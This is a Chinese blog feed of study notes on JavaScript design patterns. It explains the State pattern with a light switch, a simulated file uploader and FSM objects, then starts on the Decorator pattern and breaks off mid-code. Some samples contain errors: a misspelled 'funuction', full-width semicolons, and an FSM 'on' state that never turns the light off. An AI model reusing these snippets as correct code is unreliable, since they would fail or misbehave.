所有跟状态有关的行为，都被封装在 buttonWasPressed 方法里，如果以后这个电灯又增加了强强光、超强光和终极强光，那我们将无法预计这个方法将膨胀到什么地步。 状态的切换非常不明显，仅仅表现为对 state 变量赋值，比如 this.state = ‘weakLight’。在实际开发中，这样的操作很容易被程序员不小心漏掉。我们也没有办法一目了然地明白电灯一共有多少种状态，除非耐心地读完 buttonWasPressed 方法里的所有代码。 状态之间的切换关系，不过是往 buttonWasPressed 方法里堆砌 if、else 语句，增加或者修改一个状态可能需要改变若干个操作，这使 buttonWasPressed 更加难以阅读和维护。 状态模式改进我们通常谈到封装，一般都会优先封装对象的行为，而不是对象的状态。但在状态模式中刚好相反，状态模式的关键是把事物的每种状态都封装成单独的类，跟此状态有关的行为都被封装在这个类的内部，所以 button 被按下的时候，只需要在上下文中，把这个请求委托给当前的状态对象即可，该状态对象会负责渲染它自身的行为。 同时我们还可以把状态的切换规则事先分布在状态类中， 这样就有效地消除了原本存在的大量条件分支语句。 定义 3 个状态类，分别是 offLightState、WeakLightState、strongLightState。这 3 个类都有一个原型方法 buttonWasPressed，代表在各自状态下，按钮被按下时将发生的行为，代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243const Light = function()&#123; this.offLightState = new OffLightState(this); this.strongLightState = new StrongLightState(this); this.weakLightState = new WeakLightState(this); this.button = null;&#125;const OffLightState = function(light)&#123; this.light = light;&#125;OffLightState.prototype.buttonWasPressed = function()&#123; console.log('弱光'); this.light.setState(this.light.weakLightState);&#125;const WeakLightState = function(light)&#123; this.light = light;&#125;WeakLightState.prototype.buttonWasPressed = function()&#123; console.log('强光'); this.light.setState(this.light.strongLightState);&#125;const StrongLightState = function(light)&#123; this.light = light;&#125;StrongLightState.prototype.buttonWasPressed = function()&#123; console.log('关灯'); this.light.setState(this.light.offLightState);&#125;Light.prototype.setState = function(newState)&#123; this.currentState = newState;&#125;Light.prototype.init = function()&#123; const button = document.createElement('button'), self = this; this.button = document.body.appendChild(button); this.button.innerHTML = '开关'; this.currentState = this.offLightState; this.button.onclick = function()&#123; // 将请求委托给当前持有的状态对象去执行 self.currentState.buttonWasPressed(); &#125;&#125;const light = new Light();light.init(); 使用状态模式的好处很明显，它可以使得每一种状态和它对应的行为之间的关系局部化，这些行为被分散和封装在各自对应的状态类中，便于阅读和管理代码。 另外，状态之间的切换都被分布在状态类的内部，这使得我们无需编写过多的 if-else条件语句来控制状态之间的转换。 当我们需要为 light 对象增加一种新的状态时，只需要增加一个新的状态类，再稍稍改变一些现有的代码就可以了，假设现在 light 对象多了一种超强光的状态，那就先增加 SuperStrongLightState类： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152const Light = function()&#123; this.offLightState = new OffLightState(this); this.strongLightState = new StrongLightState(this); this.weakLightState = new WeakLightState(this); this.superStrongLightState = new SuperStrongLightState(this); this.button = null;&#125;const OffLightState = function(light)&#123; this.light = light;&#125;OffLightState.prototype.buttonWasPressed = function()&#123; console.log('弱光'); this.light.setState(this.light.weakLightState);&#125;const WeakLightState = function(light)&#123; this.light = light;&#125;WeakLightState.prototype.buttonWasPressed = function()&#123; console.log('强光'); this.light.setState(this.light.strongLightState);&#125;const StrongLightState = function(light)&#123; this.light = light;&#125;StrongLightState.prototype.buttonWasPressed = function()&#123; console.log('超强光'); this.light.setState(this.light.superStrongLightState);&#125;const SuperStrongLightState = function(light)&#123; this.light = light;&#125;SuperStrongLightState.prototype.buttonWasPressed = function()&#123; console.log('关灯'); this.light.setState(this.light.offLightState);&#125;Light.prototype.setState = function(newState)&#123; this.currentState = newState;&#125;Light.prototype.init = function()&#123; const button = document.createElement('button'), self = this; this.button = document.body.appendChild(button); this.button.innerHTML = '开关'; this.currentState = this.offLightState; this.button.onclick = function()&#123; self.currentState.buttonWasPressed(); &#125;&#125;const light = new Light();light.init(); 定义允许一个对象在其内部状态改变的时改变它的行为，对象看起来似乎修改了它的类 前半句是将状态封装成独立的类，并将请求委托给当前的状态对象，当对象的内部状态改变的时候会带来不同的行为变化。电灯的例子足以说明这一点，在 off 和 on 这里两种不同的状态下，我们点击同一个按钮，得到的行为反馈是截然不同的。 后半句是从客户的角度看，我们使用的对象，在不同的状态下具有截然不同的行为，这个对象看起来是从不同类中实例化而来的，实际上这是使用了委托的效果。 通用结构上面例子中的 Light 类在这里也被叫做上下文（Context）。随后在 Light 的构造函数中，我们要创建每一个状态类的实例对象，Context 将持有这些状态对象的引用，以便把请求委托给状态对象。用户的请求，即点击 button 的动作也是实现在 Context 中。代码如下： 123456789101112131415161718const Light = function()&#123; this.offLightState = new OffLightState(this); this.strongLightState = new StrongLightState(this); this.weakLightState = new WeakLightState(this); this.superStrongLightState = new SuperStrongLightState(this); this.button = null; &#125;Light.prototype.init = function()&#123; const button = document.createElement('button'), self = this; this.button = document.body.appendChild(button); this.button.innerHTML = '开关'; this.currentState = this.offLightState; this.button.onclick = function()&#123; self.currentState.buttonWasPressed(); &#125;&#125; 接下来可能是个苦力活，我们要编写各种状态类，light 对象被传入状态类的构造函数，状态对象也需要持有 light 对象的引用，以便调用 light 中的方法或者直接操作 light 对象 1234567const OffLightState = function(light)&#123; this.light = light;&#125;OffLightState.prototype.buttonWasPressed = function()&#123; console.log('弱光'); this.light.setState(this.light.weakLightState);&#125; 缺少抽象类的变通方式我们看到，在状态类中将定义一些共同的行为方法，Context 最终会将请求委托给状态对象的这些方法，在这个例子里，这个方法就是 buttonWasPressed。无论增加了多少种状态类，它们都必须实现 buttonWasPressed 方法 在 Java 中，所有的状态类必须继承自一个 State 抽象父类，当然如果没有共同的功能值得放入抽象父类中，也可以选择实现 State 接口。这样做的原因一方面是我们曾多次提过的向上转型，另一方面是保证所有的状态子类都实现了 buttonWasPressed 方法。遗憾的是，JavaScript 既不支持抽象类，也没有接口的概念。所以在使用状态模式的时候要格外小心，如果我们编写一个状态子类时，忘记了给这个状态子类实现 buttonWasPressed 方法，则会在状态切换的时候抛出异常。为 Context 总是把请求委托给状态对象的 buttonWasPressed 方法。 建议的解决方案跟《模板方法模式》中一致，让抽象父类的抽象方法直接抛出一个异常，这个异常至少会在程序运行期间就被发现： 123456789101112const State = function()&#123;&#125;;State.prototype.buttonWasPressed = function()&#123; throw new Error('父类的 buttonWasPressed 方法必须被重写');&#125;const SuperStrongLightState = function(light)&#123; this.light = light;&#125;SuperStrongLightState.prototype = new State();SuperStrongLightState.prototype.buttonWasPressed = function()&#123; console.log("关灯"); this.light.setState(this.light.offLightState);&#125; 实例——文件上传不论是文件上传，还是音乐、视频播放器，都可以找到一些明显的状态区分。文件上传程序中有扫描、正在上传、暂停、上传成功、上传失败这几种状态.音乐播放器可以分为加载中、正在播放、暂停、播放完毕这几种状态。点击同一个按钮，在上传中和暂停状态下的行为表现是不一样的，同时它们的样式 class 也不同。 更复杂的切换条件相对于电灯的例子，文件上传不同的地方在于，现在我们将面临更加复杂的条件切换关系。在电灯的例子中，电灯的状态总是从关到开再到关，或者从关到弱光、弱光到强光、强光再到关。看起来总是循规蹈矩的 A→B→C→A，所以即使不使用状态模式来编写电灯的程序，而是使用原始的 if、else 来控制状态切换，我们也不至于在逻辑编写中迷失自己，因为状态的切换总是遵循一些简单的规律，代码如下： 12345678910111213if ( this.state === 'off' )&#123; console.log( '开弱光' ); this.button.innerHTML = '下一次按我是强光'; this.state = 'weakLight'; &#125;else if ( this.state === 'weakLight' )&#123; console.log( '开强光' ); this.button.innerHTML = '下一次按我是关灯'; this.state = 'strongLight'; &#125;else if ( this.state === 'strongLight' )&#123; console.log( '关灯' ); this.button.innerHTML = '下一次按我是弱光'; this.state = 'off'; &#125; 而文件上传的状态切换相比要复杂得多，控制文件上传的流程需要两个节点按钮，第一个用于暂停和继续上传，第二个用于删除文件 现在看看文件在不同的状态下，点击这两个按钮将分别发生什么行为。 文件在扫描状态中，是不能进行任何操作的，既不能暂停也不能删除文件，只能等待扫描完成。扫描完成之后，根据文件的 md5 值判断，若确认该文件已经存在于服务器，则直接跳到上传完成状态。如果该文件的大小超过允许上传的最大值，或者该文件已经损坏，则跳往上传失败状态。剩下的情况下才进入上传中状态。 上传过程中可以点击暂停按钮来暂停上传，暂停后点击同一个按钮会继续上传。 扫描和上传过程中，点击删除按钮无效，只有在暂停、上传完成、上传失败之后，才能删除文件。 一些准备工作微云提供了一些浏览器插件来帮助完成文件上传。插件类型根据浏览器的不同，有可能是ActiveObject，也有可能是 WebkitPlugin。 上传是一个异步的过程，所以控件会不停地调用 JavaScript 提供的一个全局函数window.external.upload，来通知 JavaScript 目前的上传进度，控件会把当前的文件状态作为参数state 塞进 window.external.upload。在这里无法提供一个完整的上传插件，我们将简单地用setTimeout 来模拟文件的上传进度，window.external.upload 函数在此例中也只负责打印一些 log： 123456789101112131415161718192021222324window.external.upload = function(state)&#123; console.log(state); // 可能为 sign、uploading、done、error &#125;// 用于上传的插件对象const plugin = (function()&#123; const plugin = document.createElement('embed'); plugin.style.display = 'none'; plugin.type = 'application/txftn-webkit'; plugin.sign = function()&#123; console.log("开始文件扫描"); &#125; plugin.pause = function()&#123; console.log( '暂停文件上传' ); &#125;; plugin.uploading = function()&#123; console.log( '开始文件上传' ); &#125;; plugin.del = function()&#123; console.log( '删除文件上传' ); &#125; plugin.done = function()&#123; console.log( '文件上传完成' ); &#125; &#125;)(); 开始编写代码接下来开始完成其他代码的编写，先定义 Upload 类，控制上传过程的对象将从 Upload 类中创建而来。 Upload.prototype.init 方法会进行一些初始化工作，包括创建页面中的一些节点。在这些节点里，起主要作用的是两个用于控制上传流程的按钮，第一个按钮用于暂停和继续上传，第二个用于删除文件。 是 Upload.prototype.changeState 方法，它负责切换状态之后的具体行为，包括改变按钮的 innerHTML，以及调用插件开始一些“真正”的操作。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116window.external.upload = function (state) &#123; // 可能为 sign、uploading、done、error console.log(state); &#125;// 用于上传的插件对象const plugin = (function () &#123; const plugin = document.createElement('embed'); plugin.style.display = 'none'; plugin.type = 'application/txftn-webkit'; plugin.sign = function () &#123; console.log("开始文件扫描"); &#125; plugin.pause = function () &#123; console.log('暂停文件上传'); &#125;; plugin.uploading = function () &#123; console.log('开始文件上传'); &#125;; plugin.del = function () &#123; console.log('删除文件上传'); &#125; plugin.done = function () &#123; console.log('文件上传完成'); &#125; document.body.appendChild( plugin ); return plugin; &#125;)();const Upload = function (fileName) &#123; this.plugin = plugin; this.fileName = fileName; this.button1 = null; this.button2 = null; this.state = 'sign'; // 设置初始状态为 waiting&#125;Upload.prototype.init = function () &#123; const self = this; this.dom = document.createElement('div'); this.dom.innerHTML = '&lt;span&gt;文件名称:'+ this.fileName +'&lt;/span&gt;\ &lt;button data-action="button1"&gt;扫描中&lt;/button&gt;\ &lt;button data-action="button2"&gt;删除&lt;/button&gt;'; document.body.appendChild(this.dom); this.button1 = this.dom.querySelector( '[data-action="button1"]' ); this.button2 = this.dom.querySelector( '[data-action="button2"]' ); this.bindEvent(); &#125;Upload.prototype.bindEvent = function () &#123; const self = this; console.log(this); this.button1.onclick = function () &#123; if (self.state === 'sign') &#123; // 扫描状态下，任何操作无效 console.log('扫描中，点击无效...'); &#125; else if (self.state === 'uploading') &#123; // 上传中，点击切换到暂停 self.changeState('pause'); &#125; else if (self.state === 'pause') &#123; // 暂停中，点击切换到上传中 self.changeState('uploading'); &#125; else if (self.state === 'done') &#123; console.log('文件已完成上传, 点击无效'); &#125; else if (self.state === 'error') &#123; console.log('文件上传失败, 点击无效'); &#125; &#125;; this.button2.onclick = function () &#123; if (self.state === 'done' || self.state === 'error' || self.state === 'pause') &#123; // 上传完成、上传失败和暂停状态下可以删除 self.changeState('del'); &#125; else if (self.state === 'sign') &#123; console.log('文件正在扫描中，不能删除'); &#125; else if (self.state === 'uploading') &#123; console.log('文件正在上传中，不能删除'); &#125; &#125;;&#125;Upload.prototype.changeState = function( state )&#123; switch(state) &#123; case 'sign': this.plugin.sign(); this.button1.innerHTML = '扫描中，任何操作无效'; break; case 'uploading': this.plugin.uploading(); this.button1.innerHTML = '正在上传，点击暂停'; break; case 'pause': this.plugin.pause(); this.button1.innerHTML = '已暂停，点击继续上传'; break; case 'done': this.plugin.done(); this.button1.innerHTML = '上传完成'; break; case 'error': this.button1.innerHTML = '上传失败'; break; case 'del': this.plugin.del(); this.dom.parentNode.removeChild( this.dom ); console.log( '删除完成' ); break; &#125; this.state = state; &#125;; // 测试工作const uploadObj = new Upload( 'JavaScript 设计模式与开发实践' ); uploadObj.init(); window.external.upload = function( state )&#123; // 插件调用 JavaScript 的方法 uploadObj.changeState( state ); &#125;; window.external.upload( 'sign' ); // 文件开始扫描setTimeout(function()&#123; window.external.upload( 'uploading' ); // 1 秒后开始上传&#125;, 1000 ); setTimeout(function()&#123; window.external.upload( 'done' ); // 5 秒后上传完成&#125;, 5000 ); 至此就完成了一个简单的文件上传程序的编写。当然这仍然是一个反例，这里的缺点跟电灯例子中的第一段代码一样，程序中充斥着 if、else 条件分支，状态和行为都被耦合在一个巨大的方法里，我们很难修改和扩展这个状态机。文件状态之间的联系如此复杂，这个问题显得更加严重了。 运用状态模式重构文件上传状态模式在文件上传的程序中，是最优雅的解决办法之一。 第一步仍然是提供 window.external.upload 函数，在页面中模拟创建上传插件，这部分代码没有改变： 123456789101112131415161718192021222324252627window.external.upload = function (state) &#123; // 可能为 sign、uploading、done、error console.log(state); &#125;// 用于上传的插件对象const plugin = (function () &#123; const plugin = document.createElement('embed'); plugin.style.display = 'none'; plugin.type = 'application/txftn-webkit'; plugin.sign = function () &#123; console.log("开始文件扫描"); &#125; plugin.pause = function () &#123; console.log('暂停文件上传'); &#125;; plugin.uploading = function () &#123; console.log('开始文件上传'); &#125;; plugin.del = function () &#123; console.log('删除文件上传'); &#125; plugin.done = function () &#123; console.log('文件上传完成'); &#125; document.body.appendChild( plugin ); return plugin; &#125;)(); 第二步，改造 Upload 构造函数，在构造函数中为每种状态子类都创建一个实例对象： 123456789101112const Upload = function(fileName)&#123; this.plugin = plugin; this.fileName = fileName; this.button1 = null; this.button2 = null; this.signState = new SignState(this); this.uploadingState = new UploadingState(this); this.pauseState = new PauseState(this); this.doneState = new DoneState(this); this.errorState = new ErrorState(this); this.currState = this.signState;&#125; 第三步，Upload.prototype.init 方法无需改变，仍然负责往页面中创建跟上传有关的 DOM 节点，并开始绑定按钮的事件： 12345678910Upload.prototype.init = function()&#123; const that = this; this.dom = document.createElement( 'div' ); this.dom.innerHTML = '&lt;span&gt;文件名称:'+ this.fileName +'&lt;/span&gt;\ &lt;button data-action="button1"&gt;扫描中&lt;/button&gt;\ &lt;button data-action="button2"&gt;删除&lt;/button&gt;'; document.body.appendChild(this.dom); this.button1 = this.dom.querySelector( '[data-action="button1"]' ); this.button2 = this.dom.querySelector( '[data-action="button2"]' ); this.bindEvent(); &#125; 第四步，负责具体的按钮事件实现，在点击了按钮之后，Context 并不做任何具体的操作，而是把请求委托给当前的状态类来执行： 12345678910111213141516171819202122232425262728293031323334353637Upload.prototype.bindEvent = function()&#123; const self = this; this.button1.onclick = function()&#123; self.currState.clickHandler1(); &#125; this.button2.onclick = function()&#123; self.currState.clickHandler2(); &#125; &#125;// 把状态对应的逻辑行为放在 Upload 类中Upload.prototype.sign = function()&#123; this.plugin.sign(); this.currState = this.signState;&#125;Upload.prototype.uploading = function()&#123; this.button1.innerHTML = '正在上传，点击暂停'; this.plugin.uploading(); this.currState = this.uploadingState;&#125; Upload.prototype.done = function()&#123; this.button1.innerHTML = '上传完成'; this.plugin.done(); this.currState = this.doneState; &#125;; Upload.prototype.pause = function()&#123; this.button1.innerHTML = '已暂停，点击继续上传'; this.plugin.pause(); this.currState = this.pauseState; &#125;Upload.prototype.del = function()&#123; this.plugin.del(); this.dom.parentNode.removeChild(this.dom); &#125; 第五步，工作略显乏味，我们要编写各个状态类的实现。值得注意的是，我们使用了StateFactory，从而避免因为 JavaScript 中没有抽象类所带来的问题。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162const StateFactory = (function()&#123; const State = function()&#123;&#125;; State.prototype.clickHandler1 = function()&#123; throw new Error('子类必须重写父类的 clickHandler1 方法'); &#125; State.prototype.clickHandler2 = function()&#123; throw new Error('子类必须重写父类的 clickHandler2 方法'); &#125; return function(param)&#123; const F = function(uploadObj)&#123; this.uploadObj = uploadObj; &#125; F.prototype = new State(); for(let i in param)&#123; F.prototype[i] = param[i]; &#125; return F; &#125; &#125;)(); const SignState = StateFactory(&#123; clickHandler1:function()&#123; console.log('扫描中，点击无效...'); &#125;, clickHandler2:function()&#123; console.log('文件正在上传中，不能删除'); &#125;&#125;);const UploadingState = StateFactory(&#123; clickHandler1:function()&#123; this.uploadObj.pause(); &#125;, clickHandler2:function()&#123; console.log('文件正在上传中，不能删除'); &#125;&#125;);const PauseState = StateFactory(&#123; clickHandler1:function()&#123; this.uploadObj.uploading(); &#125;, clickHandler2:function()&#123; this.uploadObj.del(); &#125;&#125;);const DoneState = StateFactory(&#123; clickHandler1:function()&#123; console.log('文件已完成上传，点击无效'); &#125;, clickHandler2:function()&#123; this.uploadObj.del(); &#125;&#125;); const ErrorState = StateFactory(&#123; clickHandler1:function()&#123; console.log('文件上传失败'); &#125;, clickHandler2:function()&#123; this.uploadObj.del(); &#125;&#125;); 测试： 12345678910111213141516const uploadObj = new Upload('JavaScript 设计模式与开发实践');uploadObj.init();window.external.upload = function(state)&#123; uploadObj[state]();&#125;window.external.upload('sign');setTimeout(function()&#123; window.external.upload('uploading');&#125;,1000);setTimeout(function()&#123; window.external.upload('done');&#125;,5000); 优缺点 状态模式定义了状态与行为之间的关系，并将它们封装在一个类里面，通过增加新的状态类，很容易增加新的状态和转换。 避免 Context 无限膨胀，状态切换的逻辑被分布在状态类中，也去掉了 Context 中原本过多的条件分支。 用对象代替字符串来记录当前状态，使得状态的切换更加一目了然。 Context 中的请求动作和状态中封装的行为可以非常容易地独立变化而互不影响。 状态模式的缺点是会在系统中定义许多状态类，编写20个状态类是一项枯燥乏味的工作，而且系统中会因此而增加不少的对象，另外，由于逻辑分散在状类中，虽然避免了不受欢迎的条件分支语句，但也造成了逻辑分散的问题，我们无法在一个地方就看出整个状态机的逻辑。 性能优化点上面的；两个例子中，我们并没有太多地从性能方法考虑问题，实际上，这里有一些较大的优化方案： 有两种选择来管理 state 对象的创建和销毁。第一种是仅当 state 对象被需要时才创建并随后销毁，另一种是可以一开始就创建所有的状态对象，并且始终不销毁它们。如果 state 对象过于庞大，可以用第一种方式来节省内存，这样就可以避免一些不会用到的对象并及时回收它们。但如果状态的改变很频繁，最好一开始就把这些 state 对象都创建出来，也没有必要销毁它们，因为可能很快就再次用到它们。 上面的例子中，我们为每个 Context 对象都创建了一组 state 对象，实际上这些 state 对象之间是可以共享的，各个 Context 对象可以共享一个state 对象，也就是享元模式的应用。 和策略模式的关系状态模式和策略模式像一对双胞胎，它们都封装了一系列的算法或者行为，它们的类图看起来几乎一模一样，但在意图上有很大不同，因此它们是两种迥然不同的模式。 相同点是它们都有一个上下文、一些策略类或者状态类，上下文把请求委托给这些类来执行。 它们之间的区别是策略模式中的各个策略类之间是平等又平行的，它们之间没有任何联系，所以客户必须熟知这些策略类的作用，以便客户可以主动切换算法，而在状态模式中，状态和状态对应的行为早已经封装好了，状态之间的切换也早被规定好了，改变行为这件事情发生在状态模式的内部。对客户来说，并不需要了解这些细节，这正是状态模式的作用所在。 JavaScript 版本的状态机状态模式是状态机的实现之一，但在 JavaScript 这种无类的语言中，没有规定让状态对象一定要从类中创建而来。另外一点，JavaScript 可以非常方便地使用委托技术，并不需要实现让一个对象持有另一个对象。下面的状态机选择了通过 Function.prototype.call 方法直接把请求委托给某个字面量对象来执行。 改写电灯的例子，来展示这种更加轻巧的做法： 12345678910111213141516171819202122232425262728293031const Light = function()&#123; this.currState = FSM.off; this.button = null;&#125;Light.prototype.init = function()&#123; const button = document.createElement('button'), self = this; button.innerHTML = '已关灯'； this.button = document.body.appendChild(button); this.button.onclick = function()&#123; self.currState.buttonWasPressed.call(self); &#125;&#125;const FSM = &#123; off:&#123; buttonWasPressed:function()&#123; console.log('关灯'); this.button.innerHTML = '下一次按我是开灯'; this.currState = FSM.on; &#125; &#125;, on:&#123; buttonWasPressed:function()&#123; console.log('开灯'); this.button.innerHTML = '下一次按我是关灯'; this.currState = FSM.on; &#125; &#125;&#125;const light = new Light();light.init(); 利用下面的 delegate 函数来完成这个状态的编写，这是面向对象设计和闭包互换的一个例子，前者把变量保存为对象的属性，而后者把变量封闭在闭包形成的环境中： 1234567891011121314151617181920212223242526272829303132333435363738394041const delegate = function(client,delegation)&#123; return&#123; buttonWasPressed:function()&#123; return delegation.buttonWasPressed.apply(client,arguments); &#125; &#125;&#125;const FSM = &#123; off: &#123; buttonWasPressed: function()&#123; console.log( '关灯' ); this.button.innerHTML = '下一次按我是开灯'; this.currState = this.onState; &#125; &#125;, on: &#123; buttonWasPressed: function()&#123; console.log( '开灯' ); this.button.innerHTML = '下一次按我是关灯'; this.currState = this.offState; &#125; &#125; &#125;;const Light = function()&#123; this.offState = delegate(this,FSM.off); this.onState = delegate(this,FSM.on); this.currState =this.offState; this.button =null;&#125; Light.prototype.init = funuction()&#123; const button = document.createElement('button'), self = this; button.innerHTML = '已关灯'； this.button = document.body.appendChild(button); this.button.onclick = function()&#123; self.currState.buttonWasPressed.call(self); &#125; &#125;const light = new Light();light.init(); 实际项目中的其他状态机在实际开发中，很多场景都可以用状态机来模拟。比如一个下拉菜单在 hover 动作下有显示、悬浮、隐藏等状态，一次TCP 请求有建立连接、监听、关闭等状态，一个格斗游戏中任务有攻击、防御、跳跃、跌倒等状态。 状态机在游戏开发中也有着广泛的用途，特别是游戏 AI 的逻辑编写，HTML5 版街头霸王游戏里，游戏主角 Ryu 有走动、攻击、防御、跌倒、跳跃等多种状态。这些状态之间既互相联系又互相约束。比如 Ryu 在走动的过程中如果被攻击，就会由走动状态切换为跌倒状态。在跌倒状态下，Ryu 既不能攻击也不能防御。同样，Ryu 也不能在跳跃的过程中切换到防御状态，但是可以进行攻击。这种场景就很适合用状态机来描述。代码如下： 123456789101112131415161718192021222324const FSM = &#123; walk: &#123; attack: function()&#123; console.log( '攻击' ); &#125;, defense: function()&#123; console.log( '防御' ); &#125;, jump: function()&#123; console.log( '跳跃' ); &#125; &#125;, attack: &#123; walk: function()&#123; console.log( '攻击的时候不能行走' ); &#125;, defense: function()&#123; console.log( '攻击的时候不能防御' ); &#125;, jump: function()&#123; console.log( '攻击的时候不能跳跃' ); &#125; &#125; &#125; 小结讲解了状态模式在实际开发中的应用。状态模式也许是被大家低估的模式之一。实际上，通过状态模式重构代码之后，很多杂乱无章的代码会变得更加清晰。]]></content>
      <categories>
        <category>JavaScript设计模式</category>
      </categories>
      <tags>
        <tag>JavaScript设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript设计模式——装饰者模式]]></title>
    <url>%2F2019-03-14-JavaScript%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E2%80%94%E2%80%94%E8%A3%85%E9%A5%B0%E8%80%85%E6%A8%A1%E5%BC%8F.html</url>
    <content type="text"><![CDATA[学习曾探的 《JavaScript设计模式与开发实践》并做记录。 书籍的购买链接 设计模式的定义是：在面向对象软件设计过程中针对特定问题的简洁而优雅的解决方案。 通俗一点，设计模式是在某种场合下对某个问题的一种解决方案。是给面向对象软件开发中的一些好的设计取个名字。 JavaScript设计模式——装饰者模式在程序开发中，许多时候都并不希望某个类天生就非常庞大，一次性包含许多职责。那么我们就可以使用装饰者模式。装饰者模式可以动态地给某个对象添加一些额外的职责，而不会影响从这个类中派生的其他对象。 在传统的面向对象语言中，给对象添加功能常常使用继承的方式，但是继承的方式并不灵活，还会带来学过的问题：一方面会导致超类和子类之间存在强耦合性，当超类改变的时候，子类也会随着改变，另一方面，继承这种功能复用方式通常被称为 “白箱复用”，“白箱”是相对可见性而言的，在继承方式中，超类的内部细节是对子类可见的，继承常常被认为破坏了封装性。 使用继承还会带来另外一个问题，在完成一些功能复用的同时，有可能创建出大量的子类，使子类的数量呈爆炸性增长。比如现在有 4 种型号的自行车，我们为每种自行车都定义了一个单独的类。现在要给每种自行车都装上前灯、尾灯和铃铛这 3 种配件。如果使用继承的方式来给每种自行车创建子类，则需要 4×3 = 12 个子类。但是如果把前灯、尾灯、铃铛这些对象动态组合到自行车上面，则只需要额外增加 3 个类。 这种给对象动态地增加职责的方式称为装饰者（decorator）模式。装饰者模式能够在不改变对象自身的基础上，在程序运行期间给对象动态地添加职责。跟继承相比，装饰者是一更轻便灵活的做法，这是一种“即用即付”的方式，比如天冷了就多穿一件外套，需要飞行时就在头上插一支竹蜻蜓，遇到一堆食尸鬼时就点开 AOE（范围攻击）技能。 模拟传统面向对象语言的装饰者模式首先要提出来的是，作为一门解释执行的语言，给 JavaScript 中的对象动态添加或者改变职责是一件再简单不过的事情，虽然这种做法改动了对象自身，跟传统定义中的装饰者模式并不一样，但这无疑更符合 JavaScript 的语言特色。代码如下： 12345var obj = &#123; name:'sevn', address:'深圳'&#125;obj.address = obj.address + '福田区'; 传统面向对象语言中的装饰者模式在 JavaScript 中适用的场景不多。通常我们并不大介意改变对象自身。 假设我们在编写一个飞机大战的游戏，随着经验的增加，我们操作的飞机对象可以升级成为更加厉害的飞机，一开始这些飞机只能发射普通的子弹，升到第二级的时候可以发射导弹，升到第三级的时候可以发射原子弹。 代码实现： 12345678910111213141516171819202122232425262728293031const Plane = function()&#123;&#125;;Plane.prototype.fire = function()&#123; console.log('发射普通子弹');&#125;// 两个装饰类const MissileDecorator = function(plane)&#123; this.plane = plane;&#125;MissileDecorator.prototype.fire = function()&#123; this.plane.fire(); console.log('发射导弹');&#125;const AtomDecorator = function(plane)&#123; this.plane = plane; &#125;AtomDecorator.prototype.fire = function()&#123; this.plane.fire(); console.log('发射原子弹');&#125;// 测试let plane = new Plane();plane = new MissileDecorator(plane);plane = new AtomDecorator(plane);plane.fire();// 发射普通子弹// 发射导弹// 发射原子弹 这种给对象增加职责的方式，并没有真正改变对象自身，而是将对象放入另一个对象之中，这些对象以一条链的方式进行引用，形成一个聚合对象。这些对象都拥有相同的接口（fire 方法），当请求达到链中的某个对象的时候，这个对象会执行自身的操作，随后把请求转发给链中的下一个对象。 因为装饰者对象和它所装饰的对象拥有一致的接口，所有它们对使用该对象的客户来说是透明的，被装饰的对象也并不需要了解它曾经被装饰过，这种透明性使得我们可以递归嵌套任意多个装饰者对象。 装饰者也是包装器GoF 原想把装饰者（decorator）模式称为包装器（wrapper）模式. 从功能上而言，decorator 能很好地描述这个模式，但从结构上看，wrapper 的说法更加贴切。装饰者模式将一个对象嵌入另一个对象之中看，实际上相当于这个对象被另一个对象包装起来，形成一条包装链。请求随着这条链依次传递到所有的对象，每个对象都有处理这条请求的机会。 回到 JavaScript 的装饰者JavaScript 语言动态改变对象相当容易，我们可以直接改写对象或者对象的某个方法，并不需要使用“类”来实现装饰者模式，代码如下： 123456789101112131415161718192021222324252627const plane = &#123; fire:function()&#123; console.log('发射普通子弹'); &#125;&#125;const missileDecorator = function()&#123; console.log('发射导弹');&#125;const atomDecorator = function()&#123; console.log('发射原子弹');&#125;const fire1 = plane.fire;plane.fire = function()&#123; fire1(); missileDecorator();&#125;const fire2 = plane.fire;plane.fire = function()&#123; fire2(); atomDecorator();&#125;plane.fire(); 装饰函数在 JavaScript 中，几乎一切都是对象，其中函数又被称为一等对象。在平时的开发中，也许大部分时间都在跟函数打交道。在 JavaScript 中可以很方便地给某个对象扩展属性和方法，但却很难在不改懂某个函数源代码的情况下，给该函数添加一些额外的功能。在代码的运行期间，我们很难切入某个函数的执行环境。 要为函数添加一些功能，最简单粗暴的方式就是直接改写函数，但是这是最差的方法，直接违反了开发-封闭的原则。 可以通过保存原引用的方法就可以改写某个函数： 12345678910let a = function()&#123; console.log(1);&#125;const _a = a;a = function()&#123; _a(); console.log(1);&#125;a(); 这是实际开发中很常用的一种做法，比如我们想给 window 绑定 onload 时间，但是又不确定这个事件是不是已经被其他人绑定过了，为了避免覆盖掉之前的 window.onload 函数中的行为，我们一般都会保存好原先的 window.onload ，把它放入新的 window.onload 里面执行： 123456789window.onload = function()&#123; console.log(1);&#125;const _onload = window.onload || function()&#123;&#125;;window.onload = function()&#123; _onload(); console.log(2);&#125; 这样的代码当然是符合开放封闭原则的，我们在增加新功能的时候，确实没有修改原来的window.onload 代码，但是这种方式存在以下两个问题: 必须维护 _onload 这个中间变量，虽然看起来并不起眼，但如果函数的装饰链较长，或者需要装饰的函数很多，这些中间变量也会越来越多。 其中还遇到了 this 被劫持的问题，在 window.onload 的例子中没有这个烦恼，是因为调用普通函数 _onload时候，this 也指向 window。现在把 window.onload 改成 document.getElementById,代码如下： 12345678const _getElementById = document.getElementById;document.getElementById = function(id)&#123; console.log('3'); return _getElementById(id);&#125;const button = document.getElementById('button');// 输出： Uncaught TypeError: Illegal invocation 此时_getElementById 是一个全局函数，当调用一个全局函数时，this 是指向 window 的，而 document.getElementById 方法的内部实现需要使用 this 引用，this 在这个方法内预期是指向 document，而不是 window, 这是错误发生的原因所以使用现在的方式给函数增加功能并不保险。 改进后的代码可以满足需求，我们要手动把 document 当作上下文 this 传入_getElementById： 1234567const _getElementById = document.getElementById;document.getElementById = function(id)&#123; console.log('3'); return _getElementById.apply(document,arguments);&#125;const button = document.getElementById('button'); 用 AOP 装饰函数首先给出 Funtion.prototype.before 和 Function.prototype.after 方法： 12345678910111213141516Function.prototype.before = function(beforefn)&#123; const _self = this; return function()&#123; beforefn.apply(this,arguments); return 